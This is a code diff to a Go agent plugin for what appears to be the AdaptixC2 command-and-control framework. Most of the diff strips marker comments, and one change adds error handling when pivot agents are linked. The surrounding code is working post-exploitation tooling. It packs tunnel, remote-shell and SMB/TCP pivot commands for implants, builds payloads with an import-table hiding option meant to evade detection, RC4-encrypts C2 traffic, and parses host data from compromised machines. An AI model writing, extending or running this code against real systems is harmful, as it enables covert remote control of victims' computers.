@@ -132,7 +132,6 @@ func getBoolArg(args map[string]any, key string) bool {
 	return v
 }
 
-/// TUNNEL
 
 func (ext *ExtenderAgent) TunnelCallbacks() adaptix.TunnelCallbacks {
 	return adaptix.TunnelCallbacks{
@@ -149,77 +148,60 @@ func (ext *ExtenderAgent) TunnelCallbacks() adaptix.TunnelCallbacks {
 
 func TunnelMessageConnectTCP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
 	var packData []byte
-	/// START CODE HERE
 	array := []interface{}{COMMAND_TUNNEL_START_TCP, channelId, tunnelType, address, port}
 	packData, _ = PackArray(array)
-	/// END CODE HERE
 	return makeProxyTask(packData)
 }
 
 func TunnelMessageConnectUDP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
 	var packData []byte
-	/// START CODE HERE
 	array := []interface{}{COMMAND_TUNNEL_START_UDP, channelId, address, port}
 	packData, _ = PackArray(array)
-	/// END CODE HERE
 	return makeProxyTask(packData)
 }
 
 func TunnelMessageWriteTCP(channelId int, data []byte) adaptix.TaskData {
 	var packData []byte
-	/// START CODE HERE
 	array := []interface{}{COMMAND_TUNNEL_WRITE_TCP, channelId, len(data), data}
 	packData, _ = PackArray(array)
-	/// END CODE HERE
 	return makeProxyTask(packData)
 }
 
 func TunnelMessageWriteUDP(channelId int, data []byte) adaptix.TaskData {
 	var packData []byte
-	/// START CODE HERE
 	array := []interface{}{COMMAND_TUNNEL_WRITE_UDP, channelId, len(data), data}
 	packData, _ = PackArray(array)
-	/// END CODE HERE
 	return makeProxyTask(packData)
 }
 
 func TunnelMessagePause(channelId int) adaptix.TaskData {
 	var packData []byte
-	/// START CODE HERE
 	array := []interface{}{COMMAND_TUNNEL_PAUSE, channelId}
 	packData, _ = PackArray(array)
-	/// END CODE HERE
 	return makeProxyTask(packData)
 }
 
 func TunnelMessageResume(channelId int) adaptix.TaskData {
 	var packData []byte
-	/// START CODE HERE
 	array := []interface{}{COMMAND_TUNNEL_RESUME, channelId}
 	packData, _ = PackArray(array)
-	/// END CODE HERE
 	return makeProxyTask(packData)
 }
 
 func TunnelMessageClose(channelId int) adaptix.TaskData {
 	var packData []byte
-	/// START CODE HERE
 	array := []interface{}{COMMAND_TUNNEL_CLOSE, channelId}
 	packData, _ = PackArray(array)
-	/// END CODE HERE
 	return makeProxyTask(packData)
 }
 
 func TunnelMessageReverse(tunnelId int, port int) adaptix.TaskData {
 	var packData []byte
-	/// START CODE HERE
 	array := []interface{}{COMMAND_TUNNEL_REVERSE, tunnelId, port}
 	packData, _ = PackArray(array)
-	/// END CODE HERE
 	return makeProxyTask(packData)
 }
 
-/// TERMINAL
 
 func (ext *ExtenderAgent) TerminalCallbacks() adaptix.TerminalCallbacks {
 	return adaptix.TerminalCallbacks{
@@ -231,37 +213,30 @@ func (ext *ExtenderAgent) TerminalCallbacks() adaptix.TerminalCallbacks {
 
 func TerminalMessageStart(terminalId int, program string, sizeH int, sizeW int, oemCP int) adaptix.TaskData {
 	var packData []byte
-	/// START CODE HERE
 	programArgs := Ts.TsConvertUTF8toCp(program, oemCP)
 	array := []interface{}{COMMAND_SHELL_START, terminalId, programArgs}
 	packData, _ = PackArray(array)
-	/// END CODE HERE
 	return makeProxyTask(packData)
 }
 
 func TerminalMessageWrite(terminalId int, oemCP int, data []byte) adaptix.TaskData {
 	var packData []byte
-	/// START CODE HERE
 	dataEncode := Ts.TsConvertUTF8toCp(string(data), oemCP)
 	if oemCP > 0 {
 		dataEncode = strings.ReplaceAll(dataEncode, "\n", "\r\n")
 	}
 	array := []interface{}{COMMAND_SHELL_WRITE, terminalId, len(dataEncode), []byte(dataEncode)}
 	packData, _ = PackArray(array)
-	/// END CODE HERE
 	return makeProxyTask(packData)
 }
 
 func TerminalMessageClose(terminalId int) adaptix.TaskData {
 	var packData []byte
-	/// START CODE HERE
 	array := []interface{}{COMMAND_JOBS_KILL, terminalId}
 	packData, _ = PackArray(array)
-	/// END CODE HERE
 	return makeProxyTask(packData)
 }
 
-////// PLUGIN AGENT
 
 type GenerateConfig struct {
 	Os                 string `json:"os"`
@@ -312,7 +287,6 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 			return nil, err
 		}
 
-		/// START CODE HERE
 
 		var (
 			generateConfig GenerateConfig
@@ -521,7 +495,6 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 		}
 		agentProfiles = append(agentProfiles, []byte(profileString))
 
-		/// END CODE HERE
 	}
 	return agentProfiles, nil
 }
@@ -532,7 +505,6 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		Payload  []byte
 	)
 
-	/// START CODE HERE
 
 	if len(profile.ListenerProfiles) != 1 || len(agentProfiles) != 1 {
 		return nil, "", errors.New("only one listener profile is supported")
@@ -565,7 +537,6 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		return nil, "", err
 	}
 
-	// IAT Hiding: -nostdlib eliminates CRT, custom crt.cpp provides replacements
 	if generateConfig.IatHiding {
 		cFlags += " -DIAT_HIDING"
 		lFlags += " -nostdlib -nostartfiles -nodefaultlibs"
@@ -735,7 +706,6 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	}
 	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Payload size: %d bytes", len(Payload)))
 
-	/// END CODE HERE
 
 	return Payload, Filename, nil
 }
@@ -743,7 +713,6 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
 	var agentData adaptix.AgentData
 
-	/// START CODE HERE
 
 	packer := CreatePacker(beat)
 
@@ -796,30 +765,23 @@ func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.Exten
 	agentData.Username = Ts.TsConvertCpToUTF8(string(packer.ParseBytes()), agentData.ACP)
 	agentData.Process = Ts.TsConvertCpToUTF8(string(packer.ParseBytes()), agentData.ACP)
 
-	/// END CODE
 
 	return agentData, &ExtenderAgent{}, nil
 }
 
-// Extender methods
 
 func (ext *ExtenderAgent) Encrypt(data []byte, key []byte) ([]byte, error) {
-	/// START CODE
 	return RC4Crypt(data, key)
-	/// END CODE
 }
 
 func (ext *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {
-	/// START CODE
 	return RC4Crypt(data, key)
-	/// END CODE
 }
 
 func (ext *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
 
 	var packData []byte
 
-	/// START CODE HERE
 
 	var (
 		array []interface{}
@@ -844,7 +806,6 @@ func (ext *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix
 	binary.LittleEndian.PutUint32(size, uint32(len(packData)))
 	packData = append(size, packData...)
 
-	/// END CODE
 
 	return packData, nil
 }
@@ -855,13 +816,11 @@ func (ext *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.Ta
 		err      error = nil
 	)
 
-	/// START CODE HERE
 
 	id, _ := strconv.ParseInt(pivotId, 16, 64)
 	array := []interface{}{COMMAND_PIVOT_EXEC, int(id), len(data), data}
 	packData, _ = PackArray(array)
 
-	/// END CODE
 
 	taskData := adaptix.TaskData{
 		TaskId: fmt.Sprintf("%08x", rand.Uint32()),
@@ -897,7 +856,6 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 	}
 	messageData.Message, _ = args["message"].(string)
 
-	/// START CODE HERE
 
 	var array []interface{}
 
@@ -1514,7 +1472,6 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 
 	taskData.Data, err = PackArray(array)
 
-	/// END CODE
 
 RET:
 	return taskData, messageData, err
@@ -1532,7 +1489,6 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 		Sync:        true,
 	}
 
-	/// START CODE
 
 	decompressed, _ := decompressZlibData(decryptedData)
 
@@ -1968,15 +1924,24 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 			watermark := fmt.Sprintf("%08x", packer.ParseInt32())
 			beat := packer.ParseBytes()
 
-			childAgentId, _ := Ts.TsListenerInteralHandler(watermark, beat)
-			_ = Ts.TsPivotCreate(task.TaskId, agentData.Id, childAgentId, "", false)
+			childAgentId, linkErr := Ts.TsListenerInteralHandler(watermark, beat)
+			if linkErr != nil || childAgentId == "" {
+				errMsg := "unknown error"
+				if linkErr != nil {
+					errMsg = linkErr.Error()
+				}
+				task.MessageType = adaptix.MESSAGE_ERROR
+				task.Message = fmt.Sprintf("Link failed: %s (watermark=%s)", errMsg, watermark)
+			} else {
+				_ = Ts.TsPivotCreate(task.TaskId, agentData.Id, childAgentId, "", false)
 
-			if linkType == 1 {
-				task.Message = fmt.Sprintf("----- New SMB pivot agent: [%s]===[%s] -----", agentData.Id, childAgentId)
-				Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)
-			} else if linkType == 2 {
-				task.Message = fmt.Sprintf("----- New TCP pivot agent: [%s]===[%s] -----", agentData.Id, childAgentId)
-				Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)
+				if linkType == 1 {
+					task.Message = fmt.Sprintf("----- New SMB pivot agent: [%s]===[%s] -----", agentData.Id, childAgentId)
+					Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)
+				} else if linkType == 2 {
+					task.Message = fmt.Sprintf("----- New TCP pivot agent: [%s]===[%s] -----", agentData.Id, childAgentId)
+					Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)
+				}
 			}
 
 		case COMMAND_LS:
@@ -2135,7 +2100,6 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				task.Message = fmt.Sprintf("Burst config updated: %s", formatBurstStatus(int(burstEnabled), int(burstSleep), int(burstJitter)))
 
 			} else if subcommand == 6 {
-				// Burst show response
 				if false == packer.CheckPacker([]string{"int", "int", "int"}) {
 					goto HANDLER
 				}
@@ -2480,7 +2444,6 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 
 HANDLER:
 
-	/// END CODE
 
 	for _, task := range outTasks {
 		Ts.TsTaskUpdate(agentData.Id, task)
